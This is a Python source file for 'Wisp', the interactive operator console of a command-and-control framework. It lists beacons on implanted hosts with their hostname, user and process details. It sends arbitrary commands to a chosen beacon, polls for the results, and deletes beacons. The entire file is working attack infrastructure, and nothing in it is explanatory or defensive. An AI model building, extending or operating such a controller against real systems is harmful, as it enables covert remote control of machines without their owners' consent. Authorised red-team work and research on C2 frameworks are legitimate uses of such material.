"""Wisp — Interactive CLI Controller.

Usage:
    python -m client.c2cli --server http://localhost:8443

Commands:
    beacons              List all registered beacons
    beacon <id>          Show beacon details
    tasks <beacon_id>    List tasks for a beacon
    run <beacon_id> <cmd> [args...]   Send a command to a beacon
    delete <beacon_id>   Remove a beacon and its tasks
    watch <beacon_id>    Poll for new results every 5s
    help                 Show this help
    exit                 Exit
"""

import argparse
import json
import sys
import time
from datetime import datetime
from urllib.parse import urljoin

import requests


class C2Client:
    def __init__(self, server_url: str, verify: bool = True):
        self.base = server_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = verify
        if not verify:
            import urllib3
            urllib3.disable_warnings()

    def _get(self, path: str) -> dict:
        resp = self.session.get(urljoin(self.base + "/", path.lstrip("/")))
        resp.raise_for_status()
        return resp.json()

    def _post(self, path: str, data: dict = None) -> dict:
        resp = self.session.post(
            urljoin(self.base + "/", path.lstrip("/")),
            json=data or {},
        )
        resp.raise_for_status()
        return resp.json()

    def list_beacons(self) -> list[dict]:
        return self._get("/api/v1/beacons").get("beacons", [])

    def get_beacon(self, beacon_id: str) -> dict:
        return self._get(f"/api/v1/beacons/{beacon_id}").get("beacon", {})

    def get_tasks(self, beacon_id: str, limit: int = 50) -> list[dict]:
        return self._get(f"/api/v1/beacons/{beacon_id}/tasks?limit={limit}").get("tasks", [])

    def create_task(self, beacon_id: str, command: str, args: list = None, timeout: int = 60) -> dict:
        return self._post(f"/api/v1/beacons/{beacon_id}/tasks", {
            "command": command,
            "args": args or [],
            "timeout": timeout,
        }).get("task", {})

    def delete_beacon(self, beacon_id: str) -> bool:
        resp = self.session.delete(urljoin(self.base + "/", f"api/v1/beacons/{beacon_id}"))
        return resp.status_code == 200


def print_beacons(beacons: list[dict]):
    if not beacons:
        print("  No beacons registered.")
        return
    print(f"  {'ID':<38} {'Hostname':<20} {'User':<12} {'OS':<8} {'Arch':<8} {'Last Seen':<25}")
    print(f"  {'-'*38} {'-'*20} {'-'*12} {'-'*8} {'-'*8} {'-'*25}")
    for b in beacons:
        last = b.get("last_seen", "?")
        if last and len(last) > 19:
            last = last[:19]
        print(f"  {b['id']:<38} {b.get('hostname', '?'):<20} {b.get('username', '?'):<12} "
              f"{b.get('os', '?'):<8} {b.get('arch', '?'):<8} {last:<25}")


def print_tasks(tasks: list[dict]):
    if not tasks:
        print("  No tasks.")
        return
    print(f"  {'ID':<38} {'Command':<20} {'Status':<12} {'Created':<25}")
    print(f"  {'-'*38} {'-'*20} {'-'*12} {'-'*25}")
    for t in tasks:
        created = t.get("created_at", "?")
        if created and len(created) > 19:
            created = created[:19]
        cmd = t.get("command", "?")
        args = t.get("args", [])
        if args:
            cmd += " " + " ".join(str(a) for a in args)
        if len(cmd) > 36:
            cmd = cmd[:33] + "..."
        print(f"  {t['id']:<38} {cmd:<20} {t.get('status', '?'):<12} {created:<25}")


def watch_beacon(client: C2Client, beacon_id: str):
    """Poll for new completed tasks every 5 seconds."""
    seen = set()
    print(f"  Watching beacon {beacon_id[:8]}... Press Ctrl+C to stop.")
    try:
        while True:
            tasks = client.get_tasks(beacon_id)
            for t in tasks:
                if t["id"] not in seen and t["status"] in ("complete", "failed"):
                    seen.add(t["id"])
                    print(f"\n  [{t['status'].upper()}] {t['command']} "
                          f"{' '.join(str(a) for a in t.get('args', []))}")
                    if t.get("output"):
                        for line in t["output"].splitlines():
                            print(f"    | {line}")
                    if t.get("error"):
                        print(f"    ! ERROR: {t['error']}")
                    print()
            time.sleep(5)
    except KeyboardInterrupt:
        pass


def main():
    parser = argparse.ArgumentParser(description="Wisp C2 CLI")
    parser.add_argument("--server", "-s", default="http://127.0.0.1:8443",
                        help="Server URL (default: http://127.0.0.1:8443)")
    parser.add_argument("--insecure", "-k", action="store_true",
                        help="Disable TLS verification")
    args = parser.parse_args()

    client = C2Client(args.server, verify=not args.insecure)

    print(f"  C2 CLI — connected to {args.server}")
    print("  Type 'help' for commands.\n")

    while True:
        try:
            line = input("  c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if not line:
            continue

        parts = line.split()
        cmd = parts[0].lower()

        if cmd in ("exit", "quit"):
            break

        elif cmd == "help":
            print(__doc__)

        elif cmd == "beacons":
            beacons = client.list_beacons()
            print_beacons(beacons)

        elif cmd == "beacon" and len(parts) >= 2:
            b = client.get_beacon(parts[1])
            if b:
                print(f"  ID:        {b['id']}")
                print(f"  Hostname:  {b.get('hostname', '?')}")
                print(f"  User:      {b.get('username', '?')}")
                print(f"  OS/Arch:   {b.get('os', '?')}/{b.get('arch', '?')}")
                print(f"  PID:       {b.get('pid', '?')}")
                print(f"  First:     {b.get('first_seen', '?')}")
                print(f"  Last:      {b.get('last_seen', '?')}")
                print(f"  Sleep:     {b.get('sleep_interval', '?')}s ±{b.get('jitter', '?')}")
            else:
                print(f"  Beacon '{parts[1]}' not found.")

        elif cmd == "tasks" and len(parts) >= 2:
            limit = int(parts[2]) if len(parts) >= 3 else 50
            tasks = client.get_tasks(parts[1], limit)
            print_tasks(tasks)

        elif cmd == "run" and len(parts) >= 3:
            beacon_id = parts[1]
            command = parts[2]
            cmd_args = parts[3:] if len(parts) > 3 else []
            task = client.create_task(beacon_id, command, cmd_args)
            print(f"  Task created: {task.get('id', '?')}")
            print(f"  Command: {command} {' '.join(cmd_args)}")
            print(f"  Status: {task.get('status', '?')}")

        elif cmd == "delete" and len(parts) >= 2:
            if client.delete_beacon(parts[1]):
                print(f"  Beacon {parts[1]} deleted.")
            else:
                print(f"  Failed to delete beacon.")

        elif cmd == "watch" and len(parts) >= 2:
            watch_beacon(client, parts[1])

        elif cmd == "raw" and len(parts) >= 2:
            # Raw JSON GET for debugging
            result = client._get(" ".join(parts[1:]))
            print(json.dumps(result, indent=2))

        else:
            print(f"  Unknown command or missing arguments. Type 'help'.")


if __name__ == "__main__":
    main()
